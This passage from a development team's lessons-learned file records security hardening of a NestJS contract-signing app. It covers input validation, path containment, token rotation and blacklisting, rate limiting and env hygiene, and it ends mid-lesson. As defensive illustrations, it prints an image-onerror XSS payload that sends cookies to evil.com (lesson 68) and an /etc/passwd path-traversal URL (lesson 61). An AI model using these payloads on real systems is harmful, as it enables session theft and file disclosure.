**What happened:** The initial implementation prompt had one final commit at the end covering all 20 tasks. Claude Code correctly flagged that a single mega-commit for ~25 new files and ~15 modified files would be very difficult to review, revert, or debug.

**Fix:** Used 4 logical commit batches:
- **Commit 1:** DB layer (migration + entity + DTO + service)
- **Commit 2:** Frontend pages (legal hub + 10 policy pages + cookie banner + footer)
- **Commit 3:** Disclaimers (AI labels + claims + e-sign + billing + invite + Add-In)
- **Commit 4:** Communications (endpoint + page + sidebar)

**Rule:** For any feature branch with more than 10 file changes, plan commits by logical layer rather than by task number. Group: DB changes → API changes → Frontend pages → Frontend components → Integration/wiring. Each commit should be independently deployable and reviewable.

### Lesson 16 — Document Legal Policy Decisions in /legal-docs, Not Just in Code

**What happened:** 10 legally drafted policy documents (Terms, Privacy, Cookie, AI Policy, IP, Law Enforcement, AUP, Cancellation, Communications, BCR) were created specifically for SIGN and needed to be accessible to both the development team and legal reviewers.

**Fix:** Created `/legal-docs/` folder at project root with:
- `/policies/` — 10 DOCX files (authoritative source of truth)
- `/placement/` — Interactive HTML placement matrix
- `/prompt/` — Claude Code implementation prompt
- `README.md` — document index and usage guide
- `CLAUDE.md` updated with legal context

**Rule:** Legal documents are not code and must not live only in the frontend as TypeScript strings. Keep the authoritative DOCX versions in `/legal-docs/policies/` and treat them as source of truth. The TypeScript content files in `apps/sign/src/pages/legal/content/` are derived from these documents, not the other way around.

### Summary — Legal Layer Phase 1 Complete

- **Branch:** `feat/legal-layer` (5 commits ahead of `main`)
- **PR:** https://github.com/mohamed2ayman/signn/pull/new/feat/legal-layer
- **Verification:** 15/15 checks pass
- **TypeScript:** Clean (0 legal-layer errors)
- **Migration:** `AddConsentColumns1746950000001` executed
- **New columns:** 8 (all verified present)
- **New routes:** 11 (`/legal/*`)
- **New files:** ~25
- **Modified files:** ~15

**Remaining / Status update (2026-05-22):**
- ~~Merge `feat/legal-layer` to `main`~~ — merged as PR #8 (2026-05-15)
- ~~Run migration on production/shared DB after merge~~ — runs automatically via `migration:run` on `docker-compose up`
- Settlement agreement acknowledgment checkbox — still outstanding (when modal is built)
- ~~Arabic translations for all policy content (i18n keys stubbed)~~ — AR translations remain stubbed; **French** (`fr/common.json`, 381 lines) was added in Phase 5.5 (PR #17). AR is still outstanding.
- BCR/DPA request button gated by Enterprise plan — still outstanding (account settings)

---

## 54. SQL Injection — TypeORM Parameterization Is Already There by Default

**Finding:**
Full audit of 28 query builder files, all migrations, all raw
query calls, and the AI backend found zero SQL injection
vulnerabilities. TypeORM's named parameter binding
(.where("col = :val", { val: input })) is used consistently
throughout the codebase.

**Implication:**
When a security audit finds nothing, that IS the result.
"Phase 3.1 complete" sometimes means "verified clean" not
"fixed X vulnerabilities." Document the audit and move on.

**What to watch for on new code:**
- Always use named parameters: .where("col = :val", { val })
- Never use template literals in query strings:
  .where(`col = '${userInput}'`) ← NEVER do this
- Never concatenate user input into query strings

---

## 55. LIKE Wildcard Leakage vs SQL Injection — Different Problems

**Problem:**
8 ILIKE search patterns used correct TypeORM named parameter
binding (no SQL injection possible) but did not escape the
PostgreSQL wildcard characters % and _ in user input.

Result: searching for "100%" matched "1000", "100abc", etc.
This is a correctness/UX bug, NOT a security vulnerability.

**Fix:**
Created backend/src/common/utils/escape-like.ts with
escapeLikeParam() helper. Applied at all 6 existing ILIKE sites.

**Pattern — always use this for ILIKE/LIKE:**
import { escapeLikeParam } from '../../common/utils/escape-like';

.andWhere('col ILIKE :search', {
  search: `%${escapeLikeParam(userInput)}%`
})

**Escape order matters:**
1. Backslash first: \ → \\
2. Percent: % → \%
3. Underscore: _ → \_

Reordering causes double-escaping bugs.

---

## 56. New ILIKE Sites Need escapeLikeParam() When Branches Merge

**Context:**
Phase 3.1 investigation found 8 ILIKE sites but only 6 were
patchable — the admin-security module containing the other 2
was on an unmerged branch at the time.

**Rule:**
When any branch adds a new LIKE/ILIKE query, it MUST apply
escapeLikeParam() before merging. The pre-PR check (ship.sh)
will not catch this automatically — it requires code review.

**Files to patch when admin-security merges:**
- admin-security/services/admin-activity-log.service.ts
- admin-security/services/security-audit-log.service.ts

---

## 57. Mass Assignment via Partial<Entity> — Never Use Entities as DTOs

**Context:**
compliance-obligations.controller.ts used `@Body() body: Partial<Obligation>`
with `Object.assign(entity, body)`. The Obligation entity exposes ALL database
columns including id, contract_id, created_at, and relation fields. An attacker
could send `{ "id": "other-uuid", "contract_id": "other-contract" }` and
overwrite protected fields directly.

**Root cause:**
Using the entity class directly as a DTO is a classic mass assignment
vulnerability. TypeORM entities are database mirrors — they expose everything.
DTOs are input contracts — they expose only what the endpoint should accept.

**Fix:**
Created `UpdateObligationInlineDto` with only `status` and `completed_at`.
The controller now only receives and applies those two fields.

**Rule:**
Never use `Partial<SomeEntity>` as a `@Body()` type. Always create a dedicated
DTO class with only the fields the endpoint should accept. If the entity has 20
fields and the endpoint should update 2, the DTO has 2 fields.

---

## 58. Plain TypeScript Interfaces Get Zero Validation from class-validator

**Context:**
`ObligationFilters` was a plain TypeScript interface used as
`@Query() filters: ObligationFilters`. class-validator decorators
(like @IsEnum, @IsDateString) only work on class instances — they have no
effect on plain interfaces. Result: the status field accepted any string,
causing raw PostgreSQL errors when an invalid enum value reached TypeORM.

**Root cause:**
TypeScript interfaces exist only at compile time. At runtime, they are plain
objects with no metadata. class-validator's ValidationPipe uses reflect-metadata
to read decorators — which only exist on class instances.

**Fix:**
Converted `ObligationFilters` interface to `ObligationFiltersDto` class with
`@IsOptional() @IsEnum(ObligationStatus)` on status, `@IsDateString()` on
from/to, and `@IsString()` on string fields.

**Rule:**
Never use a plain interface for `@Query()` or `@Body()` parameters that need
validation. Always use a class with class-validator decorators. If you see
`interface XxxFilters` being used in `@Query()` or `@Body()`, it needs to be
converted to a class.

---

## 59. Every Inline @Body() Object Is a Validation Gap

**Context:**
Found 6 endpoints using inline `@Body()` objects instead of DTOs:
- `@Body() body: { clauses: { id: string; order_index: number }[] }`
- `@Body() body: { status: ComplianceFindingStatus }`
- `@Body() body: { level: string }`
- `@Body() body: { clause_ids: string[] }`
- `@Body() body: { party_first_name?: string; party_second_name?: string }`
- `@Body() body: { change_summary: string }`

None of these get validated by the global ValidationPipe. The pipe only
validates class instances with decorators. An inline `{ field: type }` object
is structurally typed at compile time only — at runtime it is unvalidated.

**Consequences found:**
- No UUID validation on IDs → raw PostgreSQL errors
- No array size limits → unbounded DB operations
- No enum validation → service receives invalid values
- No MaxLength → unbounded strings saved to DB

**Fix:**
Created a proper DTO class for each endpoint. Applied `@IsUUID`,
`@ArrayMaxSize`, `@IsEnum`, `@MaxLength` as needed.

**Rule:**
Every `@Body()` and `@Query()` parameter MUST be a class with class-validator
decorators. Never use inline object types. Code review checklist: grep for
`"@Body() [a-z]"` and verify every match is a DTO class, not an inline type.

---

## 60. multer memoryStorage Has No Size Limit by Default

**Problem:**
All 5 upload endpoints used `FileInterceptor('field')` with no options. multer's default is no file size limit. The entire uploaded file is buffered to Node.js heap before any application code runs. A 1GB upload exhausts server memory before the handler even executes.

**The trap:**
Service-level size checks (like `chat-attachment.validator.ts`'s 10MB check) run AFTER the file is already fully in memory. They prevent the file from being saved, but the memory damage is already done.

**Fix:**
Always pass limits to FileInterceptor:
```typescript
FileInterceptor('file', { limits: { fileSize: 50 * 1024 * 1024 } })
```
This causes multer to reject the upload mid-stream before the full file reaches memory.

**Also:** Handle the resulting MulterError in your exception filter — otherwise `LIMIT_FILE_SIZE` surfaces as a 500 instead of a clean 413 Payload Too Large.

---

## 61. Path Traversal in File Serving — Always Contain Paths

**Problem:**
`storage.service.ts` computed file paths by stripping a URL prefix and joining with the upload directory:
```typescript
const relativePath = fileUrl.replace(baseUrl + '/uploads/', '');
const filePath = path.join(uploadDir, relativePath);
```
If `fileUrl` contained `../` sequences after the prefix (e.g. `http://localhost:3000/uploads/../../../etc/passwd`), `path.join()` would resolve to `/etc/passwd` — outside the upload directory entirely.

**The subtle fix detail:**
A naive `startsWith('/app/uploads')` check is bypassable: `/app/uploads-evil` starts with `/app/uploads` — false positive!

The correct check appends `path.sep` to the base:
```typescript
filePath.startsWith(path.resolve(uploadDir) + path.sep)
```
This ensures only paths INSIDE the directory pass.

**Fix applied to:**
- `storage.service.ts`: `assertContained()` at getFilePath, getFileBuffer, deleteFile
- `compliance.controller.ts`: `path.resolve` + `startsWith` before `res.sendFile()`

**Rule:**
Any time you compute a file path from a URL, database value, or user input, ALWAYS verify the resolved path starts with the expected directory + `path.sep` before reading, writing, or serving.

---

## 62. Optional Chaining on Methods That Return Objects

**Problem:**
`organizations.service.ts` had:
```typescript
const fileUrl = await this.storageService.uploadFile?.(file) ?? file.originalname;
```
Two bugs:
1. `uploadFile()` returns `StorageResult` (object), not a string. Storing the whole object as `file_url` saved `[object Object]`.
2. The `??` fallback stored raw `file.originalname` as a URL — a latent path injection risk.

**Root cause:**
Optional chaining (`?.`) suppresses TypeScript errors if the method doesn't exist, masking the type mismatch. The object was stored without complaint.

**Fix:**
```typescript
const uploaded = await this.storageService.uploadFile(file as any, 'policies');
if (!uploaded) throw new InternalServerErrorException('File upload failed');
file_url: uploaded.file_url  // explicit field access
```

**Rule:**
Never use optional chaining on a method call whose return value you immediately use as a primitive. The `?.` suppresses type errors AND runtime errors simultaneously. If the method might not exist, handle that explicitly with a proper guard and type-safe field access.

---

## 63. IP Extraction Must Use a Single Shared Utility

**Context:**
Phase 4.1 found IP-extraction logic duplicated in 3 places — the auth
controller (`ctxOf()`), the admin-security IP filter middleware
(`extractIp()`), and the audit-log interceptor. Two of the three parsed
`X-Forwarded-For` consistently; the third just used
`req.headers['x-forwarded-for']` verbatim (never splitting the
comma-separated list). Any future trust-proxy or fallback change would
have to be made in all three.

**Fix:**
Created `backend/src/common/utils/get-client-ip.util.ts` exporting a single
`getClientIp(source: ExecutionContext | Request)` helper. Order: first XFF
entry → `req.ip` (honors `trust proxy`) → `socket.remoteAddress` → `'0.0.0.0'`
fallback so it never returns null. Replaced the 3 duplicates with calls to it.

**Rule:**
Always use `getClientIp()` when reading the client IP in guards, middleware,
interceptors, controllers, or throttler `getTracker` callbacks. Never
re-implement XFF parsing. The utility is the only place that gets to change
when the proxy topology changes.

---

## 64. `app.set('trust proxy', ...)` Must Be Set Before Any IP-Based Middleware

**Context:**
Phase 4.1 introduced rate limiting keyed on client IP. Without
`app.set('trust proxy', 1)` in `main.ts`, Express does **not** honor the
`X-Forwarded-For` header behind a reverse proxy — `req.ip` returns the
proxy's IP instead. In production (Render/Vercel/nginx) every request would
have looked like it came from the same IP, making rate limiting useless and
the existing IP-filter middleware unable to block real attackers.

**Fix:**
Added `app.set('trust proxy', 1)` to `main.ts` before `helmet()` and before
any IP-based middleware mounts. Also typed the Nest app as
`NestExpressApplication` so `.set()` is on the type. `1` trusts exactly one
hop — the reverse proxy — and refuses to trust chained XFF values.

**Rule:**
`app.set('trust proxy', 1)` must run before helmet, before rate limiting,
before any IP-based middleware or guard. Without it, every IP-based
security control is silently broken in production.

---

## 65. Auth Error Messages Must Never Distinguish Between Failure Reasons

**Context:**
The Phase 4.1 audit found `/auth/verify-mfa` and `/auth/verify-recovery`
returned different `UnauthorizedException` messages for "unknown email" vs
"wrong code" vs "expired OTP". An attacker could call those endpoints with
a candidate email and infer from the error string whether the email had an
account at all — full user enumeration without needing valid credentials.

**Fix:**
Normalized every failure mode in `verifyMfa()` to
`'Invalid verification code'` and every failure mode in `verifyRecoveryCode()`
to `'Invalid recovery code'`. Defined the message as a single `GENERIC_ERROR`
constant at the top of each method so no future edit can drift back to
descriptive errors. Same hard rule already applied to `login()` (audit found
it correct — both "user not found" and "wrong password" already returned
`'Invalid email or password'`).

**Rule:**
Auth-endpoint error messages must be identical regardless of whether the
failure is unknown user, wrong password, wrong code, expired token, or
missing MFA state. Different messages allow user enumeration. Always use
a single generic message constant per endpoint.

---

## 66. Rate-Limit Storage Must Be Redis-Backed in Production

**Context:**
Phase 4.1 wired up `@nestjs/throttler`. The default in-memory storage
resets on every restart and cannot be shared across multiple backend
instances — meaning, in production, an attacker would just need to wait
for a deploy or hit a different replica to bypass the limit.

**Fix:**
Configured `@nest-lab/throttler-storage-redis` with the same `REDIS_URL`
that Bull queues already use. One Redis URL serves queues + rate limiting
+ admin-health pings.

**Rule:**
Throttler storage must always be the Redis-backed implementation. In-memory
storage is fine for tests only — production and staging always Redis. Do
not introduce a separate Redis connection variable; reuse `REDIS_URL`.

---

## 67. Named Throttlers Are Not Per-Method — You Must Skip the Others

**Context:**
The `@nestjs/throttler` `ThrottlerGuard` iterates EVERY named throttler
configured at the module level on every request, unless explicitly skipped.
With 8 named buckets (`login`, `register`, `forgot`, `reset`, `mfa`,
`recovery`, `refresh`, `invitation`) configured globally, applying just
`@Throttle({ login: {} })` to the login endpoint still activated all 7
other buckets with their default limits — so login would have been blocked
at the strictest cross-bucket limit (3/hr from `register`), not its
intended 5/10min. `@Throttle({foo: {}})` only OVERRIDES bucket `foo`'s
settings — it does not narrow the set of active buckets.

**Fix:**
Created `@ThrottleOnly(name)` decorator
(`backend/src/common/decorators/throttle-only.decorator.ts`) that composes
`@UseGuards(ThrottlerGuard) + @Throttle({name: {}}) + @SkipThrottle({...all others true})`.
Methods now use a single `@ThrottleOnly('login')` and only the named bucket
applies.

**Rule:**
With named throttlers at module level, always use `@ThrottleOnly(name)` on
methods — never raw `@Throttle()` alone. If a new throttler bucket is
added to `ThrottlerModule.forRootAsync()`, also add its name to the
`THROTTLER_NAMES` constant in `throttle-only.decorator.ts`, or it won't
be auto-skipped on the other endpoints.

---


*Last updated: 2026-05-18 (Phase 4.2 JWT hardening — lessons #71–77. Includes post-ship bug fix and test mock patterns.)*

---

## 68. Email Template Injection — User Strings Must Be HTML-Escaped at Output

**Problem:**
`email.service.ts` called template functions that interpolated
user-supplied strings (display names, org names, contract names)
directly into HTML template literals without escaping.

A user setting their display name to:
`<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
would inject that tag into every invitation email they sent.
Modern email clients strip `<script>` but many execute `onerror`
and `onload` handlers on images.

**Root cause:**
Template literals interpolate strings verbatim. `${userName}`
in an HTML context is an injection point if `userName` contains
HTML characters.

**Fix:**
Created `escape-html-email.ts` with `escapeHtml()` — escapes the
5 HTML special characters: `& < > " '`
Applied at 38 call sites across all 9 email template functions.

**Critical escape order:**
`&` must be escaped FIRST. If you escape `<` first, then escape `&`,
you turn `&lt;` into `&amp;lt;` — double-escaping the ampersand.
Always: `&` → `&amp;` then `<` → `&lt;` then `>` → `&gt;` then `"` → `&quot;`

**Rule:**
Every string that comes from user input and lands in an HTML
context (email template, HTML string, innerHTML) must be
HTML-escaped at the point of interpolation. React's auto-
escaping only covers JSX — it does NOT protect template
literals, string concatenation, or innerHTML.

---

## 69. CSP connectSrc Must Include Your Production API Origin

**Problem:**
Bare `helmet()` sets a `Content-Security-Policy` header but does
not include an explicit `connectSrc` directive. The default
falls back to `defaultSrc: 'self'`. In development where
frontend and backend share localhost, this works. In
production where they may be on different origins (e.g.
`app.managex.ai` vs `api.managex.ai`), ALL fetch/XHR calls
would be silently blocked by the browser.

**Fix:**
Explicit CSP configuration with `connectSrc` including
`BASE_URL` from the config service.

**Rule:**
Always specify `connectSrc` explicitly in your CSP configuration.
Include every origin your frontend makes API calls to.
Test CSP in production-like conditions (different origins)
not just localhost where `defaultSrc: 'self'` masks the problem.

---

## 70. Two Types of HTML Escaping — Input Sanitization vs Output Escaping

**Problem:**
Phase 3.2 added `sanitize-html` (`stripHtml`) for INPUT sanitization.
Phase 3.5 added `escapeHtml` for OUTPUT escaping in emails.
These are different tools for different problems.

**The distinction:**
- INPUT sanitization (`sanitize.ts` / `stripHtml`):
  Strips HTML tags from content before storing in the database.
  Used on clause content, comments, negotiation text.
  Goal: keep the database clean of HTML.

- OUTPUT escaping (`escape-html-email.ts` / `escapeHtml`):
  Converts HTML special characters to entities at the point
  of rendering. Used in email templates.
  Goal: prevent HTML injection at the output stage.

**Why both are needed:**
Input sanitization catches content going INTO the database.
Output escaping catches content going INTO an HTML context.
Defense in depth: even if input sanitization fails or is
bypassed, output escaping prevents the HTML from executing.

**Rule:**
For any string entering an HTML context (template, innerHTML,
email body), ask two questions:
1. Was it sanitized at input? (database-stored content)
2. Is it escaped at output? (before HTML interpolation)
Both should be YES for user-supplied content.

---

## 71. Token Family Tracking Is the Correct Reuse-Attack Response

**Context:**
Phase 4.2 added refresh-token rotation. The naive implementation revokes
the old refresh token when a new one is issued — but that doesn't help
if an attacker has captured the OLD token. They simply present the old
one and the legitimate user's just-rotated session looks identical to
their stolen one.

**Lesson:**
The industry-standard answer (OAuth 2.0 BCP §4.13, Auth0, DocuSign,
Ironclad) is **token family tracking**. Every refresh token belongs to
a family identified by a `family_id` UUID. On each rotation the new
token inherits the family. When a previously-rotated (already revoked)
refresh token is presented, you don't just reject it — you revoke EVERY
session that shares its family_id. The legitimate user's current session
is burned, but they can re-login; the attacker also can't make any
further progress.

**Rule:**
- Refresh tokens MUST carry a `family_id` claim.
- The `user_sessions` row MUST persist family_id, parent_token_hash, and
  the rotation chain.
- On detected reuse, `SessionService.revokeFamily()` must be a single
  atomic UPDATE — not a loop.
- A `security.refresh_token_reuse_detected` event MUST be recorded with
  the family_id in metadata.

---

## 72. Access Token Blacklisting Requires jti Claims

**Context:**
Phase 4.2 set out to close the "logout but my access token still works
for 15 minutes" abuse window. The plan was to add a Redis blacklist on
logout. But you cannot blacklist a token by its full string — that
defeats the point of stateless JWTs (and the strings are too long).

**Lesson:**
Every access token needs a `jti` (JWT ID) claim — a short, unique
identifier. You blacklist the jti, not the token. The blacklist entry
TTL equals the access token's remaining lifetime (`exp - now`), so
Redis self-cleans expired entries — no garbage collection job needed.

**Rule:**
- `generateTokens()` MUST stamp a `randomUUID()` jti on every access token.
- The Redis key format is `blacklist:jti:{jti}` — value unused, only
  EXISTS is checked.
- `JwtStrategy.validate()` MUST check the blacklist when payload.jti is
  present. Missing-jti tokens get a logged warning, not a rejection
  (grace window for pre-Phase-4.2 tokens still in circulation).
- The blacklist service MUST fail-OPEN on Redis errors. A Redis outage
  should not lock everyone out — the session row revocation still
  catches refresh-token reuse.

---

## 73. Every Login Path Must Call _finalizeLogin

**Context:**
Phase 3.3 introduced `_finalizeLogin()` to handle UserSession creation,
device tracking, suspicious-login detection, and the new-device email.
Five login paths (register, login, verifyMfa, verifyRecoveryCode,
refreshToken) called it. One — `acceptInvitation` — did not.

**Lesson:**
A new user accepted an invitation, the inline `generateTokens()` call
issued them a working JWT, but no `user_sessions` row existed. The
SessionTrackingMiddleware had no row to update, the user couldn't be
seen in the admin "Active sessions" list, and the new-device email was
never sent. The bug was silent — there was no error, just missing
telemetry until the user happened to refresh their token.

**Rule:**
- Any code path that issues a new refresh token MUST call
  `_finalizeLogin()` with that token. No exceptions.
- When you add a NEW auth flow (SSO, social login, magic link, etc.),
  open `auth.service.ts` and copy the `_finalizeLogin()` call pattern
  from `login()` verbatim — don't reinvent it.
- The grep `grep -n "this.generateTokens" backend/src/modules/auth/auth.service.ts`
  must always be followed within ~20 lines by a `this._finalizeLogin(`
  call. If it isn't, you have a bug.

---

## 74. SessionTrackingMiddleware Must Key on jti, Not Token Hash

**Context:**
Phase 3.3 wrote `SessionTrackingMiddleware` to bump `last_active_at`
on each authenticated request. The implementation hashed the bearer
**access** token and looked it up in `user_sessions.token_hash`. The
lookup never matched, because `user_sessions.token_hash` stores
SHA-256 of the **refresh** token, not the access token. The middleware
ran on every request, swallowed the silent miss, and never updated
last_active_at — for months.

**Lesson:**
When a middleware "works" but has no observable effect, it's almost
always a key-mismatch bug. The fix in Phase 4.2 was to:
1. Add a `jti` column to `user_sessions` (stamped at session creation).
2. Have the middleware decode (no verify) the bearer to extract `jti`.
3. Look up the session by jti.

**Rule:**
- When a middleware reads from a database to side-effect a row, write
  ONE failing test asserting the side-effect actually happens — not
  just that the middleware doesn't throw. The Phase 3.3 test suite
  had no such assertion, which is why the bug survived production.
- If the lookup key is derived from the JWT, write down on paper what
  the column actually contains. "It's a hash of the JWT" is ambiguous
  — which JWT? Access or refresh? Different things.

---

## 75. Dual Storage Is Technical Debt That Must Be Retired Promptly

**Context:**
Phase 3.3 introduced `user_sessions` as the new home for refresh-token
state, replacing the single-token `users.refresh_token_hash` column.
But it did NOT remove the old column. For ~6 weeks, every login wrote
to BOTH stores (`user_sessions.token_hash` AND `users.refresh_token_hash`),
and `refreshToken()` validated against the OLD column. The new table
existed but was decorative for the refresh-validation path.

**Lesson:**
Dual storage during a migration is fine for a few days. Past that, the
old store accumulates write traffic but no read traffic, and someone
eventually writes new code reading from the WRONG store. The Phase 4.2
audit caught this only because the team specifically looked at the
refresh-token validation path.

**Rule:**
- When you introduce a replacement store, open a ticket the same day
  to delete the old store. Don't let it linger past one sprint.
- During the transition, the read path MUST go through the NEW store
  exclusively — never fall back to the old one. Falling back means
  the new store can be silently broken without anyone noticing.
- Write a migration that DROPS the old column with `DROP COLUMN IF EXISTS`
  so the cleanup is idempotent and safe to deploy multiple times.

---

## 78. revokeFamily Must Blacklist JTIs in Redis AND Revoke Sessions in DB

**Context:**
Phase 4.2 added refresh token family tracking to detect reuse attacks.
When a replayed (already-rotated) refresh token is detected, the entire
token family must be invalidated. The initial `revokeFamily()` implementation
only revoked sessions in `user_sessions` (DB rows set to `is_revoked = true`).

**The Gap:**
Revoking the DB row stops future refresh-token exchanges but does NOT
invalidate access tokens that were already issued from that family.
Access tokens are stateless JWTs — they carry no DB row. A compromised
access token remains valid for up to 15 minutes after the session row is
revoked, giving an attacker a live window.

**Fix (commit 501d48f):**
On reuse detection, BOTH operations must happen:
1. `listByFamily(familyId)` — fetch all sessions in the compromised family
2. `blacklistToken(jti, accessTtlSec)` — add each session's JTI to the
   Redis blacklist with TTL = remaining access token lifetime
3. `revokeFamily(familyId)` — flip `is_revoked = true` on all DB rows

`JwtStrategy.validate()` checks `isBlacklisted(jti)` on every authenticated
request, so the Redis blacklist provides the real-time revocation gate.

**Rule:**
- DB-only revocation of a token family is insufficient. Always pair it
  with Redis JTI blacklisting for the access tokens.
- The order matters: collect JTIs first (before rows are revoked), then
  blacklist, then revoke. Revoke before listing risks missing active JTIs.
- `blacklistToken()` must be called with TTL > 0. A TTL of 0 or negative
  is a no-op in `TokenBlacklistService` — always derive TTL from the
  access token's `exp` claim minus the current epoch.
- Regression test in `backend/src/modules/auth/tests/token-security.spec.ts`
  (TEST 6) verifies this behavior end-to-end in the unit test layer.

---

## Phase 4.3 — Secrets Hygiene (shipped 2026-05-19)

### LESSON: Seed scripts must validate their own env vars

NestJS Joi validation runs only inside the application bootstrap.
Seed scripts (`npm run seed`, `npm run seed:users`) instantiate
TypeORM directly and never touch the Nest container — so any env
vars they rely on receive ZERO validation from Joi.

Seed scripts must therefore validate required env vars themselves
and throw clear, developer-friendly errors. Never fall back to
hardcoded passwords or credentials in seed files.

**Pattern:** `requireSeedPassword(varName)` helper in
`backend/src/database/seeds/admin-users.seed.ts`. It reads
`process.env[varName]`, enforces a min length, and throws a boxed
error that names the missing var, the file to edit, and the
restart command to run.

**Rule:** Any new seed-time env var gets the same treatment — a
manual guard at the top of the seed module with a boxed error.
Never `process.env.X || 'literal-fallback'` in seed code.

### LESSON: data-source.ts runs outside NestJS — validate manually

TypeORM CLI commands (`typeorm migration:run`, `typeorm migration:generate`),
the `npm run migration:*` scripts, and standalone seed entry-points
all import `backend/src/config/data-source.ts` directly. They never
touch `app.module.ts`, so Joi validation runs zero times.

If a required env var is referenced in `data-source.ts` (today only
`DATABASE_URL`), it must be validated manually at the top of that
file with a clear `throw` if missing.

**Rule:** Any new env var added to `data-source.ts` needs a manual
validation throw — Joi is NOT protecting this path.

### LESSON: Dev-only config must be explicitly gated behind NODE_ENV

CSP entries, CORS origins, and any other dev-only configuration
must live inside an explicit `if (process.env.NODE_ENV !== 'production')`
check (or the equivalent ternary spread).

Unconditional inclusion of `localhost`, `ws://localhost:*`, or
`wss://localhost:*` in production CSP headers weakens security
posture and fails security audits. Phase 4.3 audit found two
`ws://localhost:*` / `wss://localhost:*` entries in `main.ts`
`connectSrc` that shipped in production CSP unconditionally —
fix used the same dev-only spread pattern already established for
CORS origin pushes immediately below the helmet config.

**Rule:** Every literal `localhost` in `main.ts` belongs inside
the dev-only branch. Production CSP/CORS should reference only
`baseUrl` / `frontendUrl` from ConfigService.

### LESSON: Every env var must be in .env.example AND Joi in the same commit

The Phase 1.5 rule, re-affirmed by the Phase 4.3 audit: if you
add a `configService.get('NEW_VAR')` call, the same commit must
add `NEW_VAR` to the Joi schema in `app.module.ts` AND to
`backend/.env.example` with a descriptive comment.

Missing from either side = silent failure on new developer
setups (Joi misses it → fallback to literal silently used) or
production deployments (`.env.example` misses it → ops doesn't
know to set it → empty string at runtime).

The Phase 4.3 audit found 9 env vars used in code but missing
from both: `SEED_ADMIN_PASSWORD_1/2/3`, `DOCUSIGN_RSA_PRIVATE_KEY`,
`DOCUSIGN_AUTH_SERVER`, `DOCUSIGN_BASE_PATH`, `DOCUSIGN_USER_ID`,
`UPLOAD_DIR`, `FROM_EMAIL`. The DocuSign RSA private key was the
highest-priority gap — a PEM private key undocumented in both
sources.

**Rule:** If you can `configService.get('X')` it, then `X` must
appear in both `.env.example` (with a comment) and the Joi schema
(with the right `.required()` / `.optional()` / `.default()` /
URI/email shape).

### LESSON: Use jest.isolateModules() when testing module-load-time throws

Modules that throw during initialization (at import/require time)
cannot be re-tested by simply deleting an env var and re-importing —
Jest returns the cached module. Use `jest.isolateModules()` with
`require()` inside the callback to force a fresh module load and
correctly test startup-time validation guards.

When the module under test also calls `dotenv.config()` at the top,
stub it with `jest.doMock('dotenv', () => ({ config: () => ({ parsed: {} }) }))`
INSIDE the same `jest.isolateModules` callback — otherwise dotenv
will repopulate the env var from `.env` on disk and the guard will
not throw, even with the env var deleted.

Bug found post-merge in Phase 4.3 `seed-validation.spec.ts` TEST 4.

---

## 83. Frontend — Vite Env Vars Silently Render Undefined, No Crash (Unlike Backend Joi)

**Problem:**
After pulling Phase 5.4 (commit `0a93c3e`), `VITE_MANAGEX_URL` was added to `apps/sign/.env.example` but not to the local `apps/sign/.env`. The backend started fine. The frontend started fine. No console error. No build error. No test failure. The MANAGEX backlinks in AuthLayout, AdminLayout, and TopBar simply rendered as the literal string `"undefined"` — e.g. href=`"undefined"`.

**Root Cause:**
Vite inlines `import.meta.env.VITE_*` values at **build time** (or serve time in dev). If a var is absent from `.env`, Vite substitutes `undefined`. JavaScript then coerces `undefined` to the string `"undefined"` in template literals and href attributes. There is no warning, no crash, and no way for the running app to detect the gap at runtime.

This is the opposite of backend behavior: NestJS with Joi `.required()` crashes immediately on startup if a var is missing (`Config validation error: "VAR" is required`). Backend problems are loud. Frontend Vite problems are silent.

**Fix:**
```bash
# After any git pull, check all 4 .env.example files for new vars:
diff <(grep -v '^#' apps/sign/.env.example | sort) <(grep -v '^#' apps/sign/.env | sort)
diff <(grep -v '^#' apps/managex/.env.example | sort) <(grep -v '^#' apps/managex/.env | sort)
diff <(grep -v '^#' backend/.env.example | sort) <(grep -v '^#' backend/.env | sort)
diff <(grep -v '^#' ai-backend/.env.example | sort) <(grep -v '^#' ai-backend/.env | sort)
```
Any line in `.env.example` not present in `.env` is a missing var. Add it before starting the app.

**How to Avoid:**
- Make checking all 4 `.env.example` files part of the pull routine — same discipline as lesson #34, but for all services.
- If a new Vite env var is added, the PR description MUST mention it explicitly so teammates know to add it locally.
- Quick sanity check after adding a new `VITE_*` var: search the rendered page for the word `"undefined"` — it will appear as visible text or in href attributes if any var is missing.
- See also lesson #34 (backend Joi crashes loudly on missing vars — the loud counterpart to this silent failure).

---

## 81. Testing — Frontend npm ci Must Run From Repo Root, Not apps/sign/

**Problem:**
Running `cd apps/sign && npm ci` (or `npm install`) before executing frontend tests fails with:
```
Cannot find module '@managex/tokens' from 'src/...'
```
The tests themselves may also silently import broken CSS tokens and render broken component trees.

**Root Cause:**
`apps/sign` depends on `@managex/tokens` which lives at `packages/tokens/`. This dependency is resolved via npm workspaces, defined in the **root** `package.json`:
```json
"workspaces": ["apps/*", "packages/*"]
```
Running `npm ci` inside `apps/sign/` directly ignores the workspace configuration entirely. npm treats it as a standalone package and cannot resolve `@managex/tokens` because `packages/tokens/` is outside `apps/sign/`'s own `node_modules`.

**Fix:**
Always install from the repo root:
```bash
# Correct — resolves workspace dependencies
cd <repo-root>
npm ci

# Then run tests with the workspace flag
npm -w @managex/sign run test
```

**How to Avoid:**
- The CI workflow (`.github/workflows/ci.yml`) correctly runs `npm ci` at the repo root. Match this locally.
- `backend/` is the one exception — it is NOT a workspace member and has its own `package-lock.json`. For backend tests: `cd backend && npm ci && npm test`.
- Rule of thumb: if the package.json has `"name": "@managex/..."`, it's a workspace member. Install from root.

---

## 82. Docker — docker restart Does Not Reload .env — Use docker-compose up -d

**Problem:**
Developer changes a value in `backend/.env` (e.g. sets a new `JWT_SECRET`, adds a missing `SEED_ADMIN_PASSWORD_*`, or changes `REDIS_URL`). Runs `docker restart sign-backend`. The container restarts but the old env value is still in effect — the change is invisible.

**Root Cause:**
`docker restart` stops and starts the existing container. It does **not** recreate it. Docker injects environment variables at container **creation** time (from `docker-compose up`). A restarted container carries the exact same environment it was created with, regardless of what is in `.env` now.

`docker-compose up -d` is different: it detects that the container configuration (including env) has changed and **recreates** the container from scratch, picking up the new `.env` values.

This is distinct from lesson #34 (a new Joi-required var crashes the app). Here the app may not crash — it just silently runs with the stale value.

**Fix:**
```bash
# After any .env change, recreate the affected container:
docker-compose up -d backend

# If you also changed packages (node_modules):
docker-compose up --force-recreate --renew-anon-volumes -d backend
```

**How to Avoid:**
